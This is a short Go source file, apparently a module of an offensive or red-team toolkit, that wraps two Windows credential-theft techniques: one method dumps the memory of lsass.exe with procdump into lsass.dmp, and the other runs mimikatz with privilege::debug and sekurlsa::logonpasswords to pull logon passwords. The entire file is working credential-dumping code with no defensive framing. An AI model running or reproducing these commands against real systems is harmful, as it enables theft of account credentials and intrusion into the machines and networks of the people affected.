package windows

import (
"os/exec"
)

type LSASS struct{}

func NewLSASS() *LSASS {
return &LSASS{}
}

func (l *LSASS) DumpLSASS() error {
cmd := exec.Command("procdump", "-ma", "lsass.exe", "lsass.dmp")
return cmd.Run()
}

func (l *LSASS) DumpLSASSMimikatz() error {
cmd := exec.Command("mimikatz", "privilege::debug", "sekurlsa::logonpasswords", "exit")
return cmd.Run()
}
